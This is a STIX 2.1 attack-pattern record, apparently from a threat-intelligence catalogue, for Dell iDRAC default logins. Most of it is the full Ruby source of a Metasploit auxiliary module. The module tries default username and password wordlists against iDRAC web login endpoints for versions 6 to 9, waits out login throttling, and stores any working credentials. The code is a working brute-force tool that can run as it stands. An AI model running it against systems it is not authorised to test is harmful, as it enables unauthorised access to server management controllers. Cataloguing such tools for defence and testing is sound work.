{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93e72c4f-9892-42ff-84ac-d3ac96e700d3",
    "created": "2024-08-14T16:30:03.716176Z",
    "modified": "2024-08-14T16:30:03.71618Z",
    "name": "Dell iDRAC Default Login",
    "description": " This module attempts to login to a iDRAC webserver instance using default username and password.  Tested against Dell Remote Access Controller 6 - Express version 1.50 and 1.85 Controller 7 - Enterprise 2.63.60.62 Controller 8 - Enterprise 2.83.05 Controller 9 - Enterprise 4.40.00.00 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dell_idrac.rb",
            "external_id": "dell_idrac.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Dell iDRAC Default Login',\n      'Description' => %q{\n        This module attempts to login to a iDRAC webserver instance using\n        default username and password.  Tested against Dell Remote Access\n        Controller 6 - Express version 1.50 and 1.85,\n        Controller 7 - Enterprise 2.63.60.62\n        Controller 8 - Enterprise 2.83.05\n        Controller 9 - Enterprise 4.40.00.00\n      },\n      'Author' => [\n        'Cristiano Maruti <cmaruti[at]gmail.com>', # < v8\n        'h00die' # v8, v9\n      ],\n      'References' => [\n        ['CVE', '1999-0502'] # Weak password\n      ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to the iDRAC Administration Login page', '/']),\n      OptPath.new('USER_FILE', [\n        false, 'File containing users, one per line',\n        File.join(Msf::Config.data_directory, 'wordlists', 'idrac_default_user.txt')\n      ]),\n      OptPath.new('PASS_FILE', [\n        false, 'File containing passwords, one per line',\n        File.join(Msf::Config.data_directory, 'wordlists', 'idrac_default_pass.txt')\n      ]),\n      OptInt.new('RPORT', [true, 'Default remote port', 443])\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSL', [true, 'Negotiate SSL connection', true])\n    ])\n  end\n\n  def pre_v9_url\n    normalize_uri(target_uri.path, 'data', 'login')\n  end\n\n  def v9_url\n    normalize_uri(target_uri.path, 'sysmgmt', '2015', 'bmc', 'session')\n  end\n\n  def target_url\n    proto = 'http'\n    if (rport == 443) || ssl\n      proto = 'https'\n    end\n    uri = normalize_uri(datastore['URI'])\n    \"#{proto}://#{vhost}:#{rport}#{uri}\"\n  end\n\n  def do_login_pre9(user = nil, pass = nil)\n    if @blockingtime > 0\n      sleep(@blockingtime)\n    end\n    uri = pre_v9_url\n    auth = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'SSL' => true,\n      'vars_post' => {\n        'user' => user,\n        'password' => pass\n      }\n    })\n    unless auth\n      print_error('iDRAC failed to respond to login attempt')\n      return :next_user # assume this is a temporary error\n    end\n    body = auth.body.to_s\n    if !body.match(%r{<authResult>[0|5]</authResult>}).nil?\n      print_good(\"#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: (ssl ? 'https' : 'http'),\n        user: user,\n        password: pass,\n        proof: auth.body.to_s\n      )\n      return :next_user\n    else\n      vprint_error(\"#{target_url} - Failed to login as '#{user}' with password '#{pass}'\")\n      # seen on idrac 8\n      if body =~ %r{<blockingTime>(\\d+)</blockingTime>}\n        @blockingtime = Regexp.last_match(1).to_i\n        vprint_error(\"\\tServer throttled logins at #{@blockingtime} seconds\")\n      else\n        @blockingtime = 0\n      end\n    end\n  end\n\n  def do_login_v9(user = nil, pass = nil)\n    if @blockingtime > 0\n      sleep(@blockingtime)\n    end\n    uri = v9_url\n    auth = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'SSL' => true,\n      'headers' => { 'user' => user, 'password' => pass },\n      'vars_post' => {\n        'user' => user,\n        'password' => pass\n      }\n    })\n    unless auth\n      print_error('iDRAC failed to respond to login attempt')\n      return :next_user # assume this is a temporary error\n    end\n    json = JSON.parse(auth.body)\n    if json.nil?\n      print_error('Invalid response, not JSON. Likely not an iDRAC.')\n      return\n    end\n    if json['authResult'] == 1 or json['authResult'] == 8\n      vprint_error(\"#{target_url} - Dell iDRAC - Failed to login as '#{user}' with password '#{pass}'\")\n      if !json['blockingTime'].nil? && json['blockingTime'] > 0\n        @blockingtime = json['blockingTime']\n        vprint_error(\"\\tServer throttled logins at #{@blockingtime} seconds\")\n      else\n        @blockingtime = 0\n      end\n    else\n      print_good(\"#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: (ssl ? 'https' : 'http'),\n        user: user,\n        password: pass,\n        proof: auth.body.to_s\n      )\n      return :next_user\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      last_attempted_at: DateTime.now,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    print_status(\"Verifying that login page exists at #{ip}\")\n    server_response = false\n    @blockingtime = 0\n    begin\n      # <= v8\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => pre_v9_url\n      })\n\n      if res && res.code == 200\n        server_response = true\n        if !res.body.to_s.match(/<authResult>1/).nil? || # version <8\n           !res.body.to_s.match(/<authResult>99/).nil? # version 8 of idrac shows 99 on first connect\n          print_status('Attempting authentication against iDRAC version < 9')\n\n          each_user_pass do |user, pass|\n            do_login_pre9(user, pass)\n          end\n        elsif res.code == 301\n          print_error(\"#{target_url} - Page redirect to #{res.headers['Location']}\")\n          return :abort\n        else\n          print_error(\"The iDRAC login page not detected on #{ip}\")\n          return :abort\n        end\n      end\n\n      # v9\n      unless server_response\n        res = send_request_raw({\n          'method' => 'GET',\n          'uri' => v9_url\n        })\n\n        if res && res.code == 401\n          server_response = true\n          json = JSON.parse(res.body)\n          if json.nil?\n            server_response = nil # so we can use the error message at the end\n          elsif !json['authResult'].nil? # version 9\n            print_status('Attempting authentication against iDRAC version 9')\n\n            each_user_pass do |user, pass|\n              do_login_v9(user, pass)\n            end\n          elsif res.code == 301\n            print_error(\"#{target_url} - Page redirect to #{res.headers['Location']}\")\n            return :abort\n          else\n            print_error(\"The iDRAC login page not detected on #{ip}\")\n            return :abort\n          end\n        end\n      end\n\n      unless server_response\n        print_error(\"The iDRAC login page not detected on #{ip}\")\n        return :abort\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    rescue ::OpenSSL::SSL::SSLError => e\n      return if (e.to_s.match(/^SSL_connect /)) # strange errors / exception if SSL connection aborted\n    end\n  end\nend\n"
}